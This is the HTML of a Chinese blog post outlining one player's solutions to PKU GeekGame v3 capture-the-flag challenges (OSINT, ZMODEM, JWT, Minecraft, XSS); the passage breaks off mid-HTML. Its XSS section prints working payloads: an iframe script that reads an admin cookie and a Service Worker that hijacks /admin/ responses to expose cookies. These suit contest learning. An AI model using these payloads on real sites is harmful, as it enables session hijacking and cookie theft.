@@ -1,0 +1,1893 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>taoky&#39;s GeekGame v3 writeups outline</title>
+  <meta name="description" content="今年没空（也没心情）写详细的 writeup 了，所以只能大概讲讲我对每道题的思路和一些观点了。">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://blog.taoky.moe/2023-10-22/geekgame-v3-wp-outline.html">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="taoky&#39;s blog" href="https://blog.taoky.moe/feed.xml">
+
+  <link rel="stylesheet" href="/assets/typo.css">
+<link rel="stylesheet" href="/assets/fonts.css">
+<link rel="stylesheet" href="/assets/dark.css">
+
+  <link href="/assets/fonts/bitter.css" rel="stylesheet">
+  
+  
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-8N496PNK2G"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-8N496PNK2G');
+    </script>
+  
+
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">taoky&#39;s blog</a>
+
+    <nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path
+              d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
+          </svg>
+        </span>
+      </label>
+      <div class="trigger">
+        
+        
+        <a class="page-link" href="/about/">About</a>
+        
+        
+        <a class="page-link" href="/archives/">Archives</a>
+        
+        
+        <a class="page-link" href="/projects/">Projects</a>
+        
+        
+        <a class="page-link" href="https://www.taoky.moe/TAsterisk">TA*</a>
+        
+        
+        <a class="page-link" href="https://github.com/taoky">GitHub</a>
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post typo" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">taoky&#39;s GeekGame v3 writeups outline</h1>
+    
+    <p class="post-meta"><time datetime="2023-10-22T14:00:00+00:00" itemprop="datePublished">Oct 22, 2023</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/tech/">tech</a>
+      
+    
+      
+    
+  
+
+
+ •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/tags/pku/">pku</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/tags/ctf/">ctf</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/tags/writeup/">writeup</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/tags/geekgame/">geekgame</a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+
+</p>
+  </header>
+
+  
+  <div class="user-toc">
+    <h3>TOC | 目录</h3>
+    <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#一眼盯帧">一眼盯帧</a></li>
+<li class="toc-entry toc-h2"><a href="#小北问答">小北问答!!!!!</a></li>
+<li class="toc-entry toc-h2"><a href="#z-公司的服务器">Z 公司的服务器</a></li>
+<li class="toc-entry toc-h2"><a href="#猫咪状态监视器">猫咪状态监视器</a></li>
+<li class="toc-entry toc-h2"><a href="#基本功">基本功</a></li>
+<li class="toc-entry toc-h2"><a href="#dark-room">Dark Room</a></li>
+<li class="toc-entry toc-h2"><a href="#麦恩库拉夫特部分">麦恩·库拉夫特（部分）</a></li>
+<li class="toc-entry toc-h2"><a href="#emoji-wordle">Emoji Wordle</a></li>
+<li class="toc-entry toc-h2"><a href="#第三新xss">第三新XSS</a></li>
+<li class="toc-entry toc-h2"><a href="#简单的打字稿">简单的打字稿</a></li>
+<li class="toc-entry toc-h2"><a href="#逝界计划">逝界计划</a></li>
+<li class="toc-entry toc-h2"><a href="#非法所得">非法所得</a></li>
+<li class="toc-entry toc-h2"><a href="#汉化绿色版免费下载">汉化绿色版免费下载</a></li>
+<li class="toc-entry toc-h2"><a href="#初学-c-语言部分">初学 C 语言（部分）</a></li>
+<li class="toc-entry toc-h2"><a href="#baby-stack部分">Baby Stack（部分）</a></li>
+<li class="toc-entry toc-h2"><a href="#关键词过滤喵谢谢喵部分">关键词过滤喵，谢谢喵（部分）</a></li>
+<li class="toc-entry toc-h2"><a href="#未来磁盘部分">未来磁盘（部分）</a></li>
+<li class="toc-entry toc-h2"><a href="#小章鱼的曲奇部分">小章鱼的曲奇（部分）</a></li>
+</ul>
+  </div>
+  
+
+  <div class="post-content" itemprop="articleBody">
+    <p>今年没空（也没心情）写详细的 writeup 了，所以只能大概讲讲我对每道题的思路和一些观点了。</p>
+
+<!-- more -->
+
+<!-- This markdown uses blocked Markdown
+     syntax of Kramdown, and requires modification
+     if ported to other platforms -->
+
+<h2 id="一眼盯帧">一眼盯帧</h2>
+
+<p>imagemagick convert 可以直接提取 GIF 帧到图，然后 rot13。</p>
+
+<h2 id="小北问答">小北问答!!!!!</h2>
+
+<ol>
+  <li>直接搜得到 sbatch，这个命令也是其他 slurm 的超算会用到的；</li>
+  <li><a href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile">https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile</a>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VERSION = 5
+PATCHLEVEL = 15
+SUBLEVEL = 78
+</code></pre></div>    </div>
+  </li>
+  <li><a href="https://everymac.com/ultimate-mac-lookup/?search_keywords=Watch6,16">https://everymac.com/ultimate-mac-lookup/?search_keywords=Watch6,16</a></li>
+  <li>
+    <p><a href="https://github.com/PKU-GeekGame/gs-backend/blob/2a1b6743559b95a534e186c4e170eab6b8de5400/src/store/user_profile_store.py#L64">https://github.com/PKU-GeekGame/gs-backend/blob/2a1b6743559b95a534e186c4e170eab6b8de5400/src/store/user_profile_store.py#L64</a></p>
+
+    <p>但是看到版本提示之后，用 <code class="language-plaintext highlighter-rouge">nix</code> 试了一下各个 Python 版本，结果发现输出是一样的……后来才发现自己忘记 <code class="language-plaintext highlighter-rouge">nix-shell</code> 之前 <code class="language-plaintext highlighter-rouge">deactivate</code> 虚拟环境了。</p>
+  </li>
+  <li>
+    <p><a href="https://zh.wikipedia.org/wiki/Bilibili">https://zh.wikipedia.org/wiki/Bilibili</a></p>
+
+    <blockquote>
+      <p>2010年3月16日到5月6日，AcFun爆发混乱和刷爆弹幕事件，大量视频弹幕中出现了“大陆最好的弹幕站<strong>bilibili.us</strong>”以及“大陆喷子最多的弹幕站acfun.cn”，大量会员流向bilibili[25]。2011年9月，杭州幻电科技有限公司成立。</p>
+    </blockquote>
+
+    <p>所以得看 bilibili.us 的存档：<a href="https://web.archive.org/web/20110102140319/http://bilibili.us/video/game.html">https://web.archive.org/web/20110102140319/http://bilibili.us/video/game.html</a></p>
+  </li>
+  <li>根据赞助商信息搜到 <a href="http://www.iaspbo.com.cn">http://www.iaspbo.com.cn</a>，发现这个什么世界大会 2023 年在卢森堡办，然后搜一下卢森堡知名景点（这个建筑还挺漂亮的），结果被 <a href="https://cn.tripadvisor.com/Attraction_Review-g190356-d17258920-Reviews-Court_of_Justice_of_the_European_Union-Luxembourg_City.html">https://cn.tripadvisor.com/Attraction_Review-g190356-d17258920-Reviews-Court_of_Justice_of_the_European_Union-Luxembourg_City.html</a> 坑了。之后检查了街景地图才发现不是欧盟法院，而是卢森堡音乐厅。</li>
+</ol>
+
+<h2 id="z-公司的服务器">Z 公司的服务器</h2>
+
+<p>第一题 Konsole 收不到文件，原因不明。</p>
+
+<p>我的解法是用 <a href="https://github.com/enix223/modem">https://github.com/enix223/modem</a>。这个代码在 Python 3 下有点和 bytes/str 编码有关的小问题，为了偷懒，直接在抛异常的地方 <code class="language-plaintext highlighter-rouge">.encode('iso-8859-1')</code> 了。于是只需要 <code class="language-plaintext highlighter-rouge">getc()</code> 和 <code class="language-plaintext highlighter-rouge">putc()</code> 两个函数定义就行了。</p>
+
+<p>第一问：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">getc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+    <span class="c1"># str, but keep bytes unchanged
+</span>    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">iso-8859-1</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">putc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>第二问 wireshark 提取 raw data，然后：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">server</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+<span class="n">datai</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">getc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+    <span class="c1"># str, but keep bytes unchanged
+</span>    <span class="k">global</span> <span class="n">datai</span>
+    <span class="k">assert</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">1</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">datai</span><span class="p">]</span>
+    <span class="n">datai</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="nf">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">putc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="p">):</span>
+    <span class="k">pass</span>
+</code></pre></div></div>
+
+<p>第二问我也试过手写 parser，但是输出的图片有很严重的 artifacts，可能是哪里我没考虑到。</p>
+
+<details>
+  <summary>（不正确的）解析代码</summary>
+  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">flag4.jpg</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+<span class="n">f2</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">flag42.jpg</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">rev</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">ch</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">if</span> <span class="n">ch</span> <span class="ow">in</span> <span class="p">[</span><span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">]:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">skip1</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="n">rev</span> <span class="ow">is</span> <span class="bp">False</span> <span class="ow">and</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x18</span><span class="p">:</span>
+        <span class="n">rev</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="n">rev</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">rev</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="k">if</span> <span class="n">ch</span> <span class="ow">in</span> <span class="p">[</span><span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">]:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">skip2</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">continue</span>
+        <span class="k">if</span> <span class="n">ch</span> <span class="ow">in</span> <span class="p">[</span><span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">]:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x69</span><span class="p">:</span>
+                <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span>
+                <span class="k">continue</span>
+            <span class="k">elif</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x68</span><span class="p">:</span>
+                <span class="k">break</span>
+            <span class="c1">#ch = ch
+</span>            <span class="k">continue</span>
+        <span class="k">elif</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x6c</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">7f</span><span class="sh">'</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+            <span class="n">ch</span> <span class="o">=</span> <span class="mh">0x7f</span>
+        <span class="k">elif</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x6d</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">ff</span><span class="sh">'</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+            <span class="n">ch</span> <span class="o">=</span> <span class="mh">0xff</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">ch</span> <span class="o">&amp;</span> <span class="mh">0x60</span> <span class="o">==</span> <span class="mh">0x40</span><span class="p">:</span>
+                <span class="n">ch</span> <span class="o">=</span> <span class="n">ch</span> <span class="o">^</span> <span class="mh">0x40</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">assert</span> <span class="mi">0</span>
+    <span class="c1">#if ch == 0x18:
+</span>    <span class="c1">#    rev = True
+</span>    <span class="c1">#    continue
+</span>    <span class="c1">#if rev is True:
+</span>    <span class="c1">#    if 0x40 &lt;= ch and ch != 0x69:
+</span>    <span class="c1">#        ch -= 0x40
+</span>    <span class="c1">#    else:
+</span>    <span class="c1">#        if ch != 0x69:
+</span>    <span class="c1">#            print(hex(ch))
+</span>    <span class="c1">#        i += 8
+</span>    <span class="c1">#        continue
+</span>    <span class="c1">#    rev = False
+</span>    <span class="n">f2</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">]))</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="k">break</span>
+</code></pre></div>  </div>
+</details>
+
+<h2 id="猫咪状态监视器">猫咪状态监视器</h2>
+
+<p>直接看 <code class="language-plaintext highlighter-rouge">/usr/bin/service</code> 这个脚本的源代码，可以发现很明显的「路径穿越」问题。</p>
+
+<h2 id="基本功">基本功</h2>
+
+<p><a href="https://www.freebuf.com/articles/network/255145.html">https://www.freebuf.com/articles/network/255145.html</a></p>
+
+<h2 id="dark-room">Dark Room</h2>
+
+<p>耐心玩一遍，可以发现题目地图和公开代码的几乎一致。第一个 flag 需要逃离之后 sanity 超过 115，审计代码可以发现用钥匙开门可以增加 sanity，并且可以开了又开，不限次数。</p>
+
+<p class="center"><img src="/pictures/geekgame-2023/drawing1.png" alt="示意图" /></p>
+
+<p>第二问输入非整数会输出包含代码的 exception，而生成 2048 bit 素数不是什么特别快的操作，因此根据时间差可以推断当前位是 1 还是 0。</p>
+
+<h2 id="麦恩库拉夫特部分">麦恩·库拉夫特（部分）</h2>
+
+<p>不会玩 MC。去搜了一下地图编辑器，发现 Minutor，在里面搜索牌子可以得到第一个 flag 的位置，然后进游戏切创造模式 tp 过去就行；第二个 flag Minutor 找不到，搜了一下与 MC 有关的 CTF writeups 发现 NBTExplorer，打开存档直接搜 flag，过一段时间两个 flag 都能找到。</p>
+
+<p class="center"><img src="/pictures/geekgame-2023/drawing2.png" alt="示意图 2" /></p>
+
+<p class="center"><em>创造模式下别不小心点到了牌子（本图基于真实事件改编）</em></p>
+
+<p>以上工具都可以用 wine 顺利运行。</p>
+
+<p>第三个 flag，由于对红石电路没有任何了解，不搞了。</p>
+
+<h2 id="emoji-wordle">Emoji Wordle</h2>
+
+<p>flag1 直接爆破；flag2 cookie 丢到 cyberchef 里面 decode jwt。直到第二阶段之后我一直都以为 flag3 是利用 jwt 漏洞，包括设置 alg 为 none、用空密钥签名都试过，最后突然意识到，emoji 就那么多，也是直接爆破就行了，只是爆破时每次请求要携带相同的 session，并且在一分钟内完成。</p>
+
+<h2 id="第三新xss">第三新XSS</h2>
+
+<p>第一个 flag 套个 /admin 的 iframe 直接读 iframe 里的 cookie 即可，因为 Path 没有任何安全性上的意义。</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://prob99-nxkc2w9v.geekgame.pku.edu.cn/admin"</span> <span class="na">id=</span><span class="s">"a"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">).</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">cookie</span><span class="p">},</span> <span class="mi">500</span><span class="p">)</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>第二问一开始觉得不可思议，后来想到似乎有些 web app 支持离线运行，好像是 Service Worker，然后可以搓出这样一个 worker：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">CACHE_NAME</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">v2_cache</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">CACHE_FILES</span> <span class="o">=</span> <span class="p">[</span>
+<span class="p">];</span>
+
+<span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">install</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">event</span><span class="p">.</span><span class="nf">waitUntil</span><span class="p">(</span>
+        <span class="c1">// Opening cache</span>
+        <span class="nx">caches</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">CACHE_NAME</span><span class="p">)</span>
+            <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">cache</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Opened cache</span><span class="dl">'</span><span class="p">);</span>
+                <span class="c1">// Adding cache files</span>
+                <span class="k">return</span> <span class="nx">cache</span><span class="p">.</span><span class="nf">addAll</span><span class="p">(</span><span class="nx">CACHE_FILES</span><span class="p">);</span>
+            <span class="p">})</span>
+    <span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">event</span><span class="p">.</span><span class="nf">respondWith</span><span class="p">(</span>
+        <span class="nx">caches</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// Check if request URL is "/admin/"</span>
+            <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">/admin/</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="k">new</span> <span class="nc">Response</span><span class="p">(</span>
+                    <span class="dl">'</span><span class="s1">&lt;script&gt;setTimeout(() =&gt; {document.title=document.cookie}, 1000) &lt;/script&gt;</span><span class="dl">'</span><span class="p">,</span>
+                    <span class="p">{</span> <span class="na">headers</span><span class="p">:</span> <span class="p">{</span> <span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">text/html</span><span class="dl">'</span><span class="p">}}</span>
+                <span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="k">return</span> <span class="nx">response</span><span class="p">;</span>
+            <span class="c1">// Else fetch from network</span>
+            <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">);</span>
+        <span class="p">})</span>
+    <span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>因为我们只能放次级目录，所以 HTML 里面需要显式写 <code class="language-plaintext highlighter-rouge">scope: "/"</code>：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">href=</span><span class="s">"data:,"</span><span class="nt">&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
